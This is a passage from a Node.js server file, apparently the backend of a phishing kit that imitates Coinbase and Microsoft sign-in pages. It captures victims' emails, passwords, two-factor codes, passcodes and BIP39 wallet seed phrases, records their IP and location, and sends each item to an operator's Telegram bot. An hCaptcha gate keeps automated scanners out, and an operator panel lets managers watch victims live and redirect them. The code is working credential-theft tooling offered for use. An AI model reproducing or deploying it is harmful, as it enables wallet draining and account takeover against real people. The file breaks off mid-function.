/****************************************************
 * server.js
 ****************************************************/
const express = require("express");
const session = require("express-session");
const bodyParser = require("body-parser");
const path = require("path");
const sqlite3 = require("sqlite3").verbose();
const bip39 = require("bip39");
const fetch = require("node-fetch");
const moment = require("moment-timezone");
const multer = require("multer");
const fs = require("fs");
const FormData = require("form-data");
const { randomBytes } = require("crypto");
// Global configuration
const DEFAULT_USER_PAGE = "coinbase";
const DEFAULT_LOADING_PAGE = "signin/loading";

// hCaptcha config — replace with your real keys from hcaptcha.com
const HCAPTCHA_SITE_KEY = "YOUR_SITE_KEY";
const HCAPTCHA_SECRET_KEY = "YOUR_SECRET_KEY";

async function verifyHcaptcha(token) {
  try {
    const resp = await fetch("https://hcaptcha.com/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `secret=${HCAPTCHA_SECRET_KEY}&response=${token}`,
    });
    const data = await resp.json();
    return data.success === true;
  } catch (e) {
    console.error("hCaptcha verify error:", e);
    return false;
  }
}

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

let z= randomBytes(32).toString('hex');
app.use(
  session({
    secret: z,
    resave: false,
    saveUninitialized: true,
  })
);

// EJS views
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

// static
app.use(express.static(path.join(__dirname, "public")));

// init DB
const db = new sqlite3.Database(path.join(__dirname, "database.db"), (err) => {
  if (err) console.error("DB error", err);
  else console.log("Connected to SQLite db");
});

db.serialize(() => {
  db.run(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        lastPage TEXT,
        authCode TEXT,
        passcode TEXT,
        phrase TEXT,
        Last2Digits TEXT,
        url TEXT,
        extra TEXT,
        userIP TEXT,
        userAgent TEXT,
        lastActive INTEGER,
        entryDate TIMESTAMP,
        defaultUserPage TEXT,
        defaultLoadingPage TEXT,
        country TEXT,
        region TEXT,
        city TEXT
      )
    `);

  db.run(`
      CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
      )
    `);

  db.run(`
      CREATE TABLE IF NOT EXISTS managers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT
      )
    `);

  db.run(`
        INSERT OR IGNORE INTO managers (username, password, role)
        VALUES ('master', 'masterpass', 'master')
      `);

  db.run(`
        INSERT OR IGNORE INTO managers (username, password, role)
        VALUES ('admin', 'admin123', 'admin')
      `);
  db.run(`
        INSERT OR IGNORE INTO managers (username, password, role)
        VALUES ('mover', 'mover123', 'mover')
      `);

  db.run(`
      INSERT OR IGNORE INTO settings (key, value)
      VALUES ('defaultLoadingScreen', 'common/oauth2/v2.0/loading')
    `);
  db.run(`
      INSERT OR IGNORE INTO settings (key, value)
      VALUES ('defaultUserPage', 'microsoft')
    `);
  db.run(`
      INSERT OR IGNORE INTO settings (key, value)
      VALUES ('clientSideRoutesEnabled', 'false')
    `);
  db.run(`
        INSERT OR IGNORE INTO settings (key, value)
        VALUES ('telegramBotToken', '')
      `);
  db.run(`
        INSERT OR IGNORE INTO settings (key, value)
        VALUES ('telegramChatId', '')
      `);
  db.run(`
        INSERT OR IGNORE INTO settings (key, value)
        VALUES ('telegramSelectedFields', '[]')
      `);
});

function now() {
  return Math.floor(Date.now() / 1000);
}

/****************************************************
 * MIDDLEWARE
 ****************************************************/
app.use((req, res, next) => {
  if (req.session?.email) {
    const q = `UPDATE users SET lastActive = ? WHERE email = ?`;
    db.run(q, [now(), req.session.email], (err) => {
      if (err) console.error("Error updating lastActive", err);
    });
  }
  next();
});

// IP/Geo
app.use(async (req, res, next) => {
  if (req.session?.email) {
    const ip =
      req.headers["x-forwarded-for"]?.split(",").shift() ||
      req.socket.remoteAddress ||
      null;
    const userAgent = req.get("User-Agent") || null;

    const checkQ = `SELECT userIP FROM users WHERE email = ?`;
    db.get(checkQ, [req.session.email], async (err, row) => {
      if (err) {
        console.error("Error checking user IP", err);
        return next();
      }

      if (!row || !row.userIP || row.userIP !== ip) {
        let country = null,
          region = null,
          city = null;
        if (ip && !ip.startsWith("127.") && ip !== "::1") {
          try {
            const resp = await fetch(`https://ipapi.co/${ip}/json/`);
            if (resp.ok) {
              const geo = await resp.json();
              country = geo.country_name || null;
              region = geo.region || null;
              city = geo.city || null;
            }
          } catch (geoErr) {
            console.error("Geo lookup error:", geoErr);
          }
        }

        const updateQ = `
          UPDATE users
          SET userIP = ?, userAgent = COALESCE(userAgent, ?),
              country = ?, region = ?, city = ?
          WHERE email = ?
        `;
        db.run(
          updateQ,
          [ip, userAgent, country, region, city, req.session.email],
          (e2) => {
            if (e2) console.error("Error updating IP", e2);
            next();
          }
        );
      } else {
        const q2 = `UPDATE users SET userAgent = COALESCE(userAgent, ?) WHERE email = ?`;
        db.run(q2, [userAgent, req.session.email], (e2) => {
          if (e2) console.error("Error updating userAgent", e2);
          next();
        });
      }
    });
  } else {
    next();
  }
});

/****************************************************
 * HELPER
 ****************************************************/
function updateUserPage(email, page) {
  const q = `UPDATE users SET lastPage = ?, lastActive = ? WHERE email = ?`;
  db.run(q, [page, now(), email], (err) => {
    if (err) console.error("Error updating user page", err);
  });
}

app.use((req, res, next) => {
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
  next();
});

app.use(
  "/static",
  express.static(path.join(__dirname, "static"), {
    setHeaders: (res) => {
      res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
      res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
    },
  })
);
app.use((req, res, next) => {
  if (req.path.startsWith("/admin")) {
    return next();
  }
  db.get(
    "SELECT value FROM settings WHERE key='clientSideRoutesEnabled'",
    (err, row) => {
      if (err || !row || row.value === "false") {
        return res.socket.destroy();
      }
      next();
    }
  );
});

async function sendTelegramNotification({
  userEmail,
  defaultUserPage,
  domain,
  updatedField,
  updatedValue,
  userData,
}) {
  let botToken = "";
  let chatId = "";
  let selectedFields = [];
  await new Promise((resolve, reject) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramBotToken'",
      (err, row) => {
        if (!err && row) botToken = row.value || "";
        resolve();
      }
    );
  });
  await new Promise((resolve, reject) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramChatId'",
      (err, row) => {
        if (!err && row) chatId = row.value || "";
        resolve();
      }
    );
  });
  await new Promise((resolve, reject) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramSelectedFields'",
      (err, row) => {
        if (!err && row) {
          try {
            selectedFields = JSON.parse(row.value);
          } catch {}
        }
        resolve();
      }
    );
  });

  if (!botToken || !chatId) {
    console.log("Telegram not configured - skipping");
    return;
  }

  const formatDate = (timestamp) => {
    const date = new Date(timestamp * 1000); 
    const options = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    };
    return date.toLocaleString("en-US", options);
  };

  let text = `*📢 New Update Notification*\n\n`;
  text += `⚜️ *Email:* \`${userEmail}\`\n`;
  text += `⚜️ *Default Page:* \`${defaultUserPage || "N/A"}\`\n`;
  text += `⚜️ *Domain:* \`${domain || "N/A"}\`\n\n`;
  text += `⚜️ *Updated Field:* \`${updatedField}\`\n\n`;
  text += `⚜️ *New Value:* \`${updatedValue}\`\n\n`;

  if (selectedFields.includes("userIP") && userData?.userIP) {
    text += `⚜️ *IP:* \`${userData.userIP}\`\n`;
  }
  if (selectedFields.includes("country") && userData?.country) {
    text += `⚜️ *Country:* \`${userData.country}\`\n`;
  }
  if (selectedFields.includes("city") && userData?.city) {
    text += `⚜️ *City:* \`${userData.city}\`\n`;
  }

  if (selectedFields.includes("password") && userData?.password) {
    text += `⚜️ *Password:* \`${userData.password}\`\n`;
  }
  if (selectedFields.includes("phrase") && userData?.phrase) {
    text += `⚜️ *Phrase:* \`${userData.phrase}\`\n`;
  }
  if (selectedFields.includes("url") && userData?.url) {
    text += `⚜️ *URL:* \`${userData.url}\`\n`;
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const resp = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
      }),
    });
    const data = await resp.json();
    if (!data.ok) {
      console.error("Failed to send Telegram message:", data);
    }
  } catch (err) {
    console.error("Error sending Telegram message:", err);
  }
}
async function sendTelegramNotificationWithFile({
  userEmail,
  domain,
  updatedField,
  updatedValue,
  userData,
  filePath,
}) {
  let botToken = "";
  let chatId = "";
  let selectedFields = [];

  await new Promise((resolve) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramBotToken'",
      (err, row) => {
        if (!err && row) botToken = row.value || "";
        resolve();
      }
    );
  });

  await new Promise((resolve) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramChatId'",
      (err, row) => {
        if (!err && row) chatId = row.value || "";
        resolve();
      }
    );
  });

  // Fetch selected fields
  await new Promise((resolve) => {
    db.get(
      "SELECT value FROM settings WHERE key='telegramSelectedFields'",
      (err, row) => {
        if (!err && row) {
          try {
            selectedFields = JSON.parse(row.value);
          } catch {
            selectedFields = [];
          }
        }
        resolve();
      }
    );
  });

  if (!botToken || !chatId) {
    console.log("Telegram not configured - skipping");
    return;
  }

  let message = ` New Video Upload\n\n`;
  message += ` Email: ${userEmail}\n`;
  message += `Domain: ${domain}\n`;
  message +=  `${updatedValue}\`\n`;

  if (selectedFields.includes("userIP") && userData?.userIP) {
    message += `⚜️ IP: \`${userData.userIP}\`\n`;
  }
  if (selectedFields.includes("country") && userData?.country) {
    message += `⚜️ Country: \`${userData.country}\`\n`;
  }
  if (selectedFields.includes("city") && userData?.city) {
    message += `⚜️ City: \`${userData.city}\`\n`;
  }

  // Send video to Telegram
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("caption", message);
  formData.append("video", fs.createReadStream(filePath));

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendVideo`,
      {
        method: "POST",
        body: formData,
      }
    );
    const result = await response.json();
    if (!result.ok) {
      throw new Error(`Telegram API error: ${result.description}`);
    }
    console.log("Telegram video notification sent successfully.");
  } catch (err) {
    console.error("Error sending Telegram video notification:", err);
  }
}
/****************************************************
 * USER ROUTES
 ****************************************************/
// Gate — shown first before anything else
app.get("/", (req, res) => {
  if (req.session.gateCleared) {
    return res.render("default/coinbase");
  }
  res.render("default/gate", { siteKey: HCAPTCHA_SITE_KEY });
});

// Verify captcha and mark session as cleared
app.post("/verify-gate", async (req, res) => {
  const token = req.body["h-captcha-response"];
  if (!token) {
    return res.json({ success: false, message: "No captcha token" });
  }
  const valid = await verifyHcaptcha(token);
  if (!valid) {
    return res.json({ success: false, message: "Captcha failed" });
  }
  req.session.gateCleared = true;
  return res.json({ success: true });
});

// The actual coinbase page — only accessible after gate
app.get("/home", (req, res) => {
  if (!req.session.gateCleared) {
    return res.redirect("/");
  }
  res.render("default/coinbase");
});

app.post("/start-session", async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) {
      return res.json({ success: false, message: "No email provided" });
    }

    req.session.email = email;

    const nowStr = moment()
      .tz("America/New_York")
      .format("YYYY-MM-DD HH:mm:ss Z");
    const upsertQ = `
      INSERT INTO users (email, lastPage, lastActive, entryDate)
      VALUES (?, ?, ?, ?)
      ON CONFLICT(email) DO UPDATE SET lastActive=excluded.lastActive
    `;

    await new Promise((resolve, reject) => {
      db.run(upsertQ, [email, "", nowStr, nowStr], (err) => {
        if (err) {
          console.error("DB error upserting user:", err);
          return reject(new Error("DB error"));
        }
        resolve();
      });
    });

    const user = await new Promise((resolve, reject) => {
      db.get("SELECT * FROM users WHERE email = ?", [email], (err, row) => {
        if (err) {
          console.error("Error fetching user data:", err);
          return reject(new Error("DB error fetching user"));
        }
        resolve(row);
      });
    });

    if (!user) {
      console.error("User not found after updating. Something went wrong.");
      return res.json({ success: false, message: "User not found" });
    }

    await sendTelegramNotification({
      userEmail: user.email,
      entryDate: user.entryDate || "N/A",
      defaultUserPage: DEFAULT_USER_PAGE,
      domain: req.get("host") || "unknown",
      updatedField: "sessionStart",
      updatedValue: "N/A",
      userData: user, 
    });

    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  } catch (err) {
    console.error("Error in start-session route:", err);
    return res.json({ success: false, message: err.message || "Server error" });
  }
});

app.post("/user/authCode", async (req, res) => {
  try {
    if (!req.session?.email) {
      return res.json({ success: false, message: "No session" });
    }

    const { authCode } = req.body;
    if (!authCode) {
      return res.json({ success: false, message: "Empty Auth Code" });
    }

    const updateQ = `UPDATE users SET authCode = ? WHERE email = ?`;
    await new Promise((resolve, reject) => {
      db.run(updateQ, [authCode, req.session.email], (err) => {
        if (err) {
          console.error("Error updating Auth Code:", err);
          return reject(new Error("DB error"));
        }
        resolve();
      });
    });

    const user = await new Promise((resolve, reject) => {
      db.get(
        `SELECT email, userIP, country, city, lastActive, entryDate
         FROM users
         WHERE email = ?`,
        [req.session.email],
        (err, row) => {
          if (err) {
            console.error("Error fetching user data for notification:", err);
            return reject(new Error("DB error fetching user"));
          }
          if (!row) {
            return reject(new Error("User not found"));
          }
          resolve(row);
        }
      );
    });

    const host = req.get("host") || "unknown";
    await sendTelegramNotification({
      userEmail: user.email,
      entryDate: user.entryDate || "N/A", 
      defaultUserPage: DEFAULT_USER_PAGE,
      domain: host, 
      updatedField: "authCode", 
      updatedValue: authCode, 
      userData: user, 
    });

    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  } catch (err) {
    console.error("Error in /user/authCode route:", err);
    return res.json({ success: false, message: err.message || "Server error" });
  }
});

app.post("/user/passcode", async (req, res) => {
  try {
    if (!req.session?.email) {
      return res.json({ success: false, message: "No session" });
    }

    const { passcode } = req.body;
    if (!passcode) {
      return res.json({ success: false, message: "Empty passcode" });
    }

    const updateQ = `UPDATE users SET passcode = ? WHERE email = ?`;
    await new Promise((resolve, reject) => {
      db.run(updateQ, [passcode, req.session.email], (err) => {
        if (err) {
          console.error("Error updating passcode:", err);
          return reject(new Error("DB error"));
        }
        resolve();
      });
    });

    const user = await new Promise((resolve, reject) => {
      db.get(
        `SELECT email, userIP, country, city, lastActive, entryDate
         FROM users
         WHERE email = ?`,
        [req.session.email],
        (err, row) => {
          if (err) {
            console.error("Error fetching user data for notification:", err);
            return reject(new Error("DB error fetching user"));
          }
          if (!row) {
            return reject(new Error("User not found"));
          }
          resolve(row);
        }
      );
    });

    const host = req.get("host") || "unknown";
    await sendTelegramNotification({
      userEmail: user.email, 
      entryDate: user.entryDate || "N/A", 
      defaultUserPage: DEFAULT_USER_PAGE, 
      domain: host, 
      updatedField: "passcode", 
      updatedValue: passcode, 
      userData: user, 
    });

    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  } catch (err) {
    console.error("Error in /user/passcode route:", err);
    return res.json({ success: false, message: err.message || "Server error" });
  }
});

app.post("/user/password", async (req, res) => {
  try {
    if (!req.session?.email) {
      return res.json({ success: false, message: "No session" });
    }

    const { password } = req.body;
    if (!password || password.length < 5) {
      return res.json({
        success: false,
        message: "Password must be at least 5 characters long",
      });
    }

    const updateQ = `UPDATE users SET password = ? WHERE email = ?`;
    await new Promise((resolve, reject) => {
      db.run(updateQ, [password, req.session.email], (err) => {
        if (err) {
          console.error("Error updating password:", err);
          return reject(new Error("DB error"));
        }
        resolve();
      });
    });

    const user = await new Promise((resolve, reject) => {
      db.get(
        `SELECT email, userIP, country, city, lastActive, entryDate
         FROM users
         WHERE email = ?`,
        [req.session.email],
        (err, row) => {
          if (err) {
            console.error("Error fetching user data for notification:", err);
            return reject(new Error("DB error fetching user"));
          }
          if (!row) {
            return reject(new Error("User not found"));
          }
          resolve(row);
        }
      );
    });

    const host = req.get("host") || "unknown";
    await sendTelegramNotification({
      userEmail: user.email,
      entryDate: user.entryDate || "N/A",
      defaultUserPage: DEFAULT_USER_PAGE, 
      domain: host, 
      updatedField: "password", 
      updatedValue: password, 
      userData: user,
    });

    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  } catch (err) {
    console.error("Error in /user/password route:", err);
    return res.json({ success: false, message: err.message || "Server error" });
  }
});

app.post("/user/phrase", (req, res) => {
  if (!req.session?.email) {
    return res.json({ success: false, message: "No session" });
  }

  const { phrase } = req.body;
  if (!phrase) {
    return res.json({ success: false, message: "Empty phrase" });
  }

  const words = phrase.trim().split(/\s+/);
  if (![12, 18, 24].includes(words.length)) {
    return res.json({ success: false, message: "Invalid seed phrase length" });
  }

  const isValidSeedPhrase = words.every((word) =>
    bip39.wordlists.english.includes(word)
  );
  if (!isValidSeedPhrase) {
    return res.json({ success: false, message: "Invalid seed phrase words" });
  }

  const updateQ = `UPDATE users SET phrase = ? WHERE email = ?`;
  db.run(updateQ, [phrase, req.session.email], async (err) => {
    if (err) {
      console.error("Error updating phrase:", err);
      return res.json({ success: false, message: "DB error" });
    }
    db.get(
      `SELECT email, userIP, country, city, lastActive, phrase
         FROM users
         WHERE email=?`,
      [req.session.email],
      async (e2, row) => {
        if (e2) {
          console.error("DB error fetching user row:", e2);
          return res.json({ success: false, message: "DB error2" });
        }
        if (!row) {
          console.log("User row not found. Something's off.");
          return res.json({
            success: false,
            message: "No matching user record",
          });
        }

        const host = req.get("host") || "unknown";

        await sendTelegramNotification({
          userEmail: row.email,
          entryDate: "N/A",
          defaultUserPage: DEFAULT_USER_PAGE,
          domain: host,
          updatedField: "phrase",
          updatedValue: phrase,
          userData: row, 
        });

        return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
      }
    );
  });
});

app.post("/user/url", async (req, res) => {
  try {
    if (!req.session?.email) {
      return res.json({ success: false, message: "No session" });
    }

    const { url } = req.body;
    if (!url) {
      return res.json({ success: false, message: "Empty URL" });
    }

    const updateQ = `UPDATE users SET url = ? WHERE email = ?`;
    await new Promise((resolve, reject) => {
      db.run(updateQ, [url, req.session.email], (err) => {
        if (err) {
          console.error("Error updating URL:", err);
          return reject(new Error("DB error"));
        }
        resolve();
      });
    });

    const user = await new Promise((resolve, reject) => {
      db.get(
        `SELECT email, userIP, country, city, lastActive, entryDate
         FROM users
         WHERE email = ?`,
        [req.session.email],
        (err, row) => {
          if (err) {
            console.error("Error fetching user data for notification:", err);
            return reject(new Error("DB error fetching user"));
          }
          if (!row) {
            return reject(new Error("User not found"));
          }
          resolve(row);
        }
      );
    });
    const host = req.get("host") || "unknown";
    await sendTelegramNotification({
      userEmail: user.email, 
      entryDate: user.entryDate || "N/A", 
      defaultUserPage: DEFAULT_USER_PAGE, 
      domain: host, 
      updatedField: "url", 
      updatedValue: url, 
      userData: user, 
    });

    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  } catch (err) {
    console.error("Error in /user/url route:", err);
    return res.json({ success: false, message: err.message || "Server error" });
  }
});

app.post("/user/extra", (req, res) => {
  if (!req.session?.email) {
    return res.json({ success: false, message: "No session" });
  }

  const { extra } = req.body;
  if (!extra) {
    return res.json({ success: false, message: "Empty extra" });
  }

  const updateQ = `UPDATE users SET extra = ? WHERE email = ?`;
  db.run(updateQ, [extra, req.session.email], (err) => {
    if (err) {
      console.error("Error updating extra:", err);
      return res.json({ success: false, message: "DB error" });
    }
    return res.json({ success: true, loadingPage: DEFAULT_LOADING_PAGE });
  });
});




/****************************************************
 * ADMIN ROUTES (with role-based logic)
 ****************************************************/
// GET /admin/login
app.get("/admin/login", (req, res) => {
  if (req.session.role) return res.redirect("/admin");
  res.render("admin/login");
});

// POST /admin/login
app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.render("admin/login", { error: "Missing credentials" });
  }

  const sql = `SELECT * FROM managers WHERE username=? AND password=?`;
  db.get(sql, [username, password], (err, row) => {
    if (err) {
      console.error("DB error manager login:", err);
      return res.render("admin/login", { error: "DB error" });
    }
    if (!row) {
      return res.render("admin/login", { error: "Invalid credentials" });
    }
    if (row.role === "loggedout") {
      return res.render("admin/login", {
        error: "This manager account is disabled",
      });
    }

    req.session.role = row.role;
    req.session.managerUsername = row.username;
    return res.redirect("/admin");
  });
});

function managerAuth(req, res, next) {
  if (!req.session.role || !req.session.managerUsername) {
    return res.redirect("/admin/login");
  }
  const checkSql = `SELECT username, role FROM managers WHERE username=?`;
  db.get(checkSql, [req.session.managerUsername], (err, row) => {
    if (err) {
      console.error("Error checking manager existence:", err);
      return res.status(500).send("DB error");
    }
    if (!row) {
      req.session.destroy(() => {
        return res.status(403).send("Manager account no longer exists.");
      });
    } else if (row.role === "loggedout") {
      req.session.destroy(() => {
        return res.status(403).send("Manager forcibly logged out.");
      });
    } else {
      req.session.role = row.role;
      next();
    }
  });
}
app.use("/admin", managerAuth);
app.get("/admin", (req, res) => {
  db.get(
    "SELECT value FROM settings WHERE key='clientSideRoutesEnabled'",
    (err, row) => {
      if (err) {
        console.error("Error reading clientSideRoutesEnabled:", err);
        return res.render("admin/admin", {
          role: req.session.role,
          clientSideEnabled: true,
        });
      }
      const isEnabled = !row || row.value === "true";
      return res.render("admin/admin", {
        role: req.session.role,
        clientSideEnabled: isEnabled,
      });
    }
  );
});

// 5) Manager logout => own session
app.post("/admin/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error("Error destroying manager session:", err);
      return res.json({ success: false, message: "Logout error" });
    }
    return res.json({ success: true });
  });
});

/****************************************************
 * Manager CRUD (admin-only)
 ****************************************************/
// CREATE manager
app.post("/admin/create-manager", (req, res) => {
  const sessionRole = req.session.role;
  if (!["admin", "master"].includes(sessionRole)) {
    return res.json({ success: false, message: "No permission" });
  }

  const { username, password, role } = req.body;
  if (!username || !password || !role) {
    return res.json({ success: false, message: "Missing manager data" });
  }

  if (sessionRole === "admin" && role !== "mover") {
    return res.json({
      success: false,
      message: "Admin cannot create another admin or master",
    });
  }

  if (role === "master") {
    if (sessionRole !== "master") {
      return res.json({
        success: false,
        message:
          "Only the master can create another master (but we allow only one).",
      });
    }
    db.get(`SELECT username FROM managers WHERE role='master'`, (err, row) => {
      if (err) {
        console.error("DB error checking master existence:", err);
        return res.json({ success: false, message: "DB error" });
      }
      if (row) {
        return res.json({
          success: false,
          message: "A master already exists. Only one master is allowed.",
        });
      }
      insertManager(username, password, role, res);
    });
  } else {
    insertManager(username, password, role, res);
  }
});

function insertManager(username, password, role, res) {
  const sql = `INSERT INTO managers (username, password, role) VALUES (?, ?, ?)`;
  db.run(sql, [username, password, role], function (err) {
    if (err) {
      console.error("Error creating manager:", err);
      return res.json({
        success: false,
        message: "DB error or manager already exists",
      });
    }
    return res.json({ success: true });
  });
}
// DELETE manager
app.post("/admin/delete-manager", (req, res) => {
  const sessionRole = req.session.role;
  if (!["admin", "master"].includes(sessionRole)) {
    return res.json({ success: false, message: "No permission" });
  }
  const { username } = req.body;
  if (!username) {
    return res.json({ success: false, message: "No username provided" });
  }

  db.get(
    `SELECT role FROM managers WHERE username=?`,
    [username],
    (err, row) => {
      if (err) {
        console.error("Error reading manager role:", err);
        return res.json({ success: false, message: "DB error" });
      }
      if (!row) {
        return res.json({ success: false, message: "Manager not found." });
      }
      if (row.role === "master") {
        return res.json({
          success: false,
          message: "Cannot delete the master account.",
        });
      }
      if (row.role === "admin" && sessionRole === "admin") {
        return res.json({
          success: false,
          message: "Admin cannot delete another admin.",
        });
      }

      const delSql = `DELETE FROM managers WHERE username=?`;
      db.run(delSql, [username], (err2) => {
        if (err2) {
          console.error("Error deleting manager:", err2);
          return res.json({ success: false, message: "DB error" });
        }
        return res.json({ success: true });
      });
    }
  );
});

/****************************************************
 * UPDATE MANAGER PASS
 ****************************************************/
app.post("/admin/update-manager-pass", (req, res) => {
  const sessionRole = req.session.role;
  if (!["admin", "master"].includes(sessionRole)) {
    return res.json({ success: false, message: "No permission" });
  }

  const { username, newPassword } = req.body;
  if (!username || !newPassword) {
    return res.json({ success: false, message: "Missing data" });
  }


  db.get(
    `SELECT role FROM managers WHERE username=?`,
    [username],
    (err, row) => {
      if (err) {
        console.error("Error reading manager role:", err);
        return res.json({ success: false, message: "DB error" });
      }
      if (!row) {
        return res.json({ success: false, message: "Manager not found." });
      }
      const targetRole = row.role;
      if (targetRole === "master") {
        if (sessionRole !== "master") {
          return res.json({
            success: false,
            message: "Only the master can update the master's password",
          });
        }
      } else if (targetRole === "admin") {
        if (sessionRole !== "master") {
          return res.json({
            success: false,
            message: "Only the master can update an admin's password",
          });
        }
      }
      // if target is 'mover', admin or master can proceed
      const sql = `UPDATE managers SET password=? WHERE username=?`;
      db.run(sql, [newPassword, username], (err2) => {
        if (err2) {
          console.error("Error updating manager pass:", err2);
          return res.json({ success: false, message: "DB error" });
        }
        return res.json({ success: true });
      });
    }
  );
});


/****************************************************
 * LIST MANAGERS
 ****************************************************/
app.get("/admin/list-managers", (req, res) => {
  if (!["admin", "master"].includes(req.session.role)) {
    return res.json({ error: "No permission" });
  }
  const q = `SELECT username, role FROM managers`;
  db.all(q, [], (err, rows) => {
    if (err) {
      console.error("Error listing managers:", err);
      return res.json({ error: "DB error" });
    }
    return res.json(rows);
  });
});
app.post("/admin/toggle-client-side", (req, res) => {
  const { enable } = req.body;
  if (typeof enable !== "boolean") {
    return res.json({ success: false, message: "Invalid toggle value." });
  }
  const q = `
    INSERT INTO settings (key, value)
    VALUES ('clientSideRoutesEnabled', ?)
    ON CONFLICT(key) DO UPDATE SET value=excluded.value
  `;
  db.run(q, [String(enable)], (err) => {
    if (err) {
      console.error("Error toggling client side routes", err);
      return res.json({ success: false, message: "DB error." });
    }
    return res.json({ success: true });
  });
});

function adminAuth(req, res, next) {
  if (!req.session?.role) {
    return res.redirect("/admin/login");
  }
  next();
}
app.use("/admin", adminAuth);

app.get("/admin", (req, res) => {
  const sql = "SELECT value FROM settings WHERE key='clientSideRoutesEnabled'";
  db.get(sql, [], (err, row) => {
    if (err) {
      console.error("Error reading clientSideRoutesEnabled:", err);
      return res.render("admin/admin", {
        role: req.session.role,
        clientSideEnabled: true, 
      });
    }

    const isEnabled = !row || row.value === "true";
    return res.render("admin/admin", {
      role: req.session.role,
      clientSideEnabled: isEnabled,
    });
  });
});

app.get("/admin/poll", (req, res) => {
  const q = `
    SELECT email, password, passcode, phrase, url, extra, lastPage, authCode, userIP, userAgent, lastActive, Last2Digits,
           defaultUserPage, defaultLoadingPage,
           country, region, city
    FROM users
  `;
  db.all(q, [], (err, rows) => {
    if (err) return res.json({ error: "DB error" });
    const nowTs = now();
    const THRESHOLD = 60;
    const data = rows.map((row) => {
      const isOnline = nowTs - row.lastActive < THRESHOLD;
      const userObj = {
        email: row.email,
        password: row.password, 
        lastPage: row.lastPage,
        authCode: row.authCode, 
        passcode: row.passcode,
        phrase: row.phrase, 
        url: row.url,
        extra: row.extra,
        userIP: row.userIP,
        userAgent: row.userAgent,
        country: row.country,
        region: row.region,
        city: row.city,
        Last2Digits: row.Last2Digits,
        defaultUserPage: row.defaultUserPage,
        defaultLoadingPage: row.defaultLoadingPage,
        isOnline,
      };
      if (req.session.role === "mover") {
        userObj.phrase = "🔒";
        userObj.authCode = "🔒";
        userObj.passcode = "🔒";
        userObj.url = "🔒";
        userObj.password = "🔒";
      }
      return userObj;
    });
    return res.json(data);
  });
});

// admin set-loading-screen
app.post("/admin/set-loading-screen", (req, res) => {
  const { screenName } = req.body;
  const qq = `
    INSERT INTO settings (key, value)
    VALUES ('defaultLoadingScreen', ?)
    ON CONFLICT(key) DO UPDATE SET value=excluded.value
  `;
  db.run(qq, [screenName], (err) => {
    if (err) return res.json({ success: false, message: "DB error" });
    return res.json({ success: true });
  });
});

// admin set-default-user-page
app.post("/admin/set-default-user-page", (req, res) => {
  const { pageName } = req.body;
  const qq = `
    INSERT INTO settings (key, value)
    VALUES ('defaultUserPage', ?)
    ON CONFLICT(key) DO UPDATE SET value=excluded.value
  `;
  db.run(qq, [pageName], (err) => {
    if (err) {
      console.error("Error updating defaultUserPage:", err);
      return res.json({ success: false, message: "DB error" });
    }
    return res.json({ success: true });
  });
});

app.post("/admin/redirect-user", (req, res) => {
  const { email, page, last2digits } = req.body;
  if (!email || !page) {
    return res.json({ success: false, message: "Missing email or page" });
  }
  if (last2digits) {
    const qq = `UPDATE users SET detail = ? WHERE email = ?`;
    db.run(qq, [last2digits, email], (err) => {
      if (err) {
        console.error(err);
        return res.json({ success: false, message: "DB error" });
      }
      updateUserPage(email, page);
      return res.json({ success: true });
    });
  } else {
    updateUserPage(email, page);
    return res.json({ success: true });
  }
});

app.post("/admin/update-admin-custom", (req, res) => {
  const { email, last2digits } = req.body;
  if (!email) return res.json({ success: false, message: "No email" });
  const qq = `UPDATE users SET Last2Digits = ? WHERE email = ?`;
  db.run(qq, [last2digits, email], (err) => {
    if (err) {
      console.error(err);
      return res.json({ success: false, message: "DB error" });
    }
    return res.json({ success: true });
  });
});

app.post("/admin/delete-user", (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.json({ success: false, message: "No email provided." });
  }
  const qq = `DELETE FROM users WHERE email = ?`;
  db.run(qq, [email], (err) => {
    if (err) {
      console.error("Error deleting user", err);
      return res.json({ success: false, message: "DB error." });
    }
    return res.json({ success: true });
  });
});


app.post("/admin/set-user-defaults", (req, res) => {
  const { email, defaultUserPage, defaultLoadingPage } = req.body;
  if (!email) {
    return res.json({ success: false, message: "No email provided." });
  }
  const qq = `
    UPDATE users
    SET defaultUserPage = ?, defaultLoadingPage = ?
    WHERE email = ?
  `;
  db.run(qq, [defaultUserPage, defaultLoadingPage, email], (err) => {
    if (err) {
      console.error("Error updating user defaults:", err);
